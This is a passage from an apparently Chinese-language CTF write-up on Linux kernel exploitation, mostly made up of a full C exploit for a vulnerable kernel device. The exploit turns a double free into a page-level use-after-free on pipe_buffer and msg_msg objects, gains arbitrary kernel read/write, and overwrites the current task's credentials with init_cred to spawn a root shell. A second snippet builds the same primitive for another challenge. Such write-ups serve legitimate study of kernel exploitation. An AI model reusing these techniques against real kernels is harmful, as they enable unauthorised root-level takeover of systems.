class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>    <span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">int</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">int</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">struct msgbuf &#123;</span><br><span class="hljs-comment">    long mtype;</span><br><span class="hljs-comment">    char mtext[0];</span><br><span class="hljs-comment">&#125;;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">peek_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build_msg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * II - interface to interact with /dev/kcache</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-comment">/* msg type */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REQUEST    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REPLY      2</span><br><br><span class="hljs-comment">/* user to kernel request */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ENCRYPT_TEA     1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DECRYPT_TEA     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_HASH_MD5        3</span><br><br><span class="hljs-comment">/* msg status */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS      1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_FAIL         2</span><br><br><span class="hljs-comment">/* for ioctl */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RECV_MSG 0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEND_MSG 0x1919810</span><br><br><span class="hljs-comment">/* message header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> type;<br>    <span class="hljs-type">uint16_t</span> cmd;<br>    <span class="hljs-type">uint16_t</span> status;    <span class="hljs-comment">/* for TYPE_REPLY only */</span><br>    <span class="hljs-type">size_t</span>  tag;        <span class="hljs-comment">/* for user to identify different message */</span><br>    <span class="hljs-type">size_t</span> data_len;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tea_crypt_info</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">char</span> text[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_msg_hdr(_hdr, _type, _cmd, _status, _tag, _data_len)        \</span><br><span class="hljs-meta">    do &#123;                                                        \</span><br><span class="hljs-meta">        _hdr-&gt;type = _type;                                     \</span><br><span class="hljs-meta">        _hdr-&gt;cmd = _cmd;                                       \</span><br><span class="hljs-meta">        _hdr-&gt;status = _status;                                 \</span><br><span class="hljs-meta">        _hdr-&gt;tag = _tag;                                       \</span><br><span class="hljs-meta">        _hdr-&gt;data_len = _data_len;                             \</span><br><span class="hljs-meta">    &#125; while (0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_hdr_data(__hdr, ptr_type) (&#123;                        \</span><br><span class="hljs-meta">    ((ptr_type*) &amp;__hdr-&gt;data);                                 \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">kkk_send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> msg_hdr *msg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, SEND_MSG, msg);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">kkk_recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> msg_hdr *msg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, RECV_MSG, msg);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  III - FIRST exploit stage - make page-level UAF</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_LEVEL_PIPE_NUM 0x100</span><br><br><span class="hljs-type">int</span> rw_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> second_level_pipe[SECOND_LEVEL_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> msqid;<br><span class="hljs-type">size_t</span> msg_buf[<span class="hljs-number">0x1000</span>], *pipe_buf, pipe_ops;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_uaf_on_msg_and_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> *<span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">size_t</span> checksum;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">char</span> *buf;<br><br>    msqid = get_msg_queue();<br><br>    msg = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>    <span class="hljs-built_in">memset</span>(msg, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(*msg));<br>    set_msg_hdr(msg, TYPE_REQUEST, CMD_ENCRYPT_TEA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(*msg));<br><br>    <span class="hljs-comment">/* prepare the pipes in advance */</span><br>    pipe(rw_pipe);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * trigger double free to make pipe_buffer and msg_seg the same object.</span><br><span class="hljs-comment">     * note that we should write and read the pipe in advance, so that it won&#x27;t</span><br><span class="hljs-comment">     * use the pipe_buffer[0], which will lead to an invalid msg_seg</span><br><span class="hljs-comment">     */</span><br>    kkk_send_msg(dev_fd, msg);<br>    sleep(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (kkk_recv_msg(dev_fd, (<span class="hljs-keyword">struct</span> msg_hdr *) <span class="hljs-number">0xbeefedead0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[=] errno: %d\n&quot;</span>, errno);<br>    &#125;<br>    fcntl(rw_pipe[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>);<br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    read(rw_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">if</span> (kkk_recv_msg(dev_fd, (<span class="hljs-keyword">struct</span> msg_hdr *) <span class="hljs-number">0xdeadbeef0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[=] errno: %d\n&quot;</span>, errno);<br>    &#125;<br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    peek_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    pipe_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) msg_buf + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg));<br>    <span class="hljs-keyword">if</span> (pipe_buf[<span class="hljs-number">12</span>] &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to make UAF on pipe!&quot;</span>);<br>    &#125;<br>    pipe_ops = pipe_buf[<span class="hljs-number">12</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully build UAF pipe_buffer!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Page: \033[0m%lx &quot;</span>, pipe_buf[<span class="hljs-number">10</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m, ops: \033[0m%lx\n&quot;</span>, pipe_ops);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">fake_buf</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    fake_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;pipe_buf[<span class="hljs-number">5</span>];<br>    read_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    fake_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_buf-&gt;len = <span class="hljs-number">0x1ff8</span>;<br>    fake_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) pipe_ops;<br><br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    read(rw_pipe[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0xfff</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    fake_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;pipe_buf[<span class="hljs-number">10</span>];<br>    read_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    fake_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_buf-&gt;len = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) pipe_ops;<br><br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    len = len &gt; <span class="hljs-number">0xffe</span> ? <span class="hljs-number">0xffe</span> : len;<br><br>    write(rw_pipe[<span class="hljs-number">1</span>], buf, len);<br>&#125;<br><br><span class="hljs-type">size_t</span> data_buf[<span class="hljs-number">0x1000</span>], *tsk_buf, current_task_page, current_task, parent_task;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">seek_current_task_struct</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span>  *comm_addr;<br><br>    vmemmap_base = pipe_buf[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe(vmemmap_base + i * <span class="hljs-number">0x40</span>, data_buf);<br>    <br>        comm_addr = memmem(data_buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-61</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-60</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-61</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-54</span>] - <span class="hljs-number">2528</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-54</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%lx\n&quot;</span>,<br>                   (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) data_buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe(ptask_page_addr, data_buf);<br>        arbitrary_read_by_pipe(ptask_page_addr+<span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">309</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">309</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">367</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">381</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe(current_task_page, data_buf);<br>    arbitrary_read_by_pipe(current_task_page + <span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) data_buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">367</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">368</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">381</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe(current_task_page, data_buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe(current_task_page + <span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kkk&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open /dev/kkk!&quot;</span>);<br>    &#125;<br><br>    construct_uaf_on_msg_and_pipe();<br>    seek_current_task_struct();<br>    privilege_escalation_by_task_overwrite();<br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒï¼š</p><p><img src="https://s2.loli.net/2023/07/13/sr65qaWAN9lE4Cy.png" alt="image.png"></p><blockquote><p><del>ç¬”è€…ä¹Ÿä¸è®°å¾—è¯¥ç¼–è¯‘é€‰é¡¹æ˜¯å¦é»˜è®¤å¼€å¯äº†</del>ï¼Œè‹¥æœªå¼€å¯è¯¥ç¼–è¯‘é€‰é¡¹ï¼Œåˆ™ä»å¯ä»¥ç›´æ¥æ„é€  page-level UAFï¼Œä»¥ç¬”è€…å»å¹´å‡ºçš„é¢˜ç›® <code>d3kheap</code> ä¸ºä¾‹ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼å®Œæˆ page UAF çš„æ„é€ ï¼Œç»†èŠ‚å‚è§æ³¨é‡Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_LEVEL_PIPE_NUM 0x100</span><br><br><span class="hljs-type">int</span> victim_pipe[<span class="hljs-number">2</span>], vuln_pipe[<span class="hljs-number">2</span>], holder_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> second_level_pipe[SECOND_LEVEL_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">size_t</span> pipe_buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_page_uaf_with_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> checksum;<br><br>    <span class="hljs-built_in">memset</span>(pipe_buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pipe_buf));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        pipe(second_level_pipe[i]);<br>    &#125;<br><br>    <span class="hljs-comment">/* make two pipes point to the same buffer */</span><br>    add();<br>    del();<br>    pipe(victim_pipe);<br>    <br>    del();<br>    pipe(vuln_pipe);<br><br>    <span class="hljs-comment">/* init pipe-&gt;head and pipe-&gt;tail, allocate page on buffer */</span><br>    write(victim_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rat3bant&quot;</span>, <span class="hljs-number">8</span>);<br>    write(vuln_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* migrate to another buffer, now we have two bufs point on the same page */</span><br>    fcntl(vuln_pipe[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>);<br>    write(vuln_pipe[<span 